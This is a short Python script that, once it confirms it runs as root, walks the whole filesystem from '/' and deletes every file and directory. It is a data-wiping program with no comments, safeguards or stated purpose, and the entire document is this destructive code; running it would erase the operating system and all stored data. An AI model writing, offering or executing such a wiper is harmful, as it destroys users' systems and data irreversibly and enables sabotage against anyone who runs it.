import os
import shutil

if os.getuid() != 0:
	print("Run as administator")
	quit()

root = os.path.expanduser("/")
os.chdir(root)

files = []
dirs = []

for path, subdirs, files in os.walk(root):
	for file in files:
		os.remove(os.path.join(path, file))
	shutil.rmtree(path)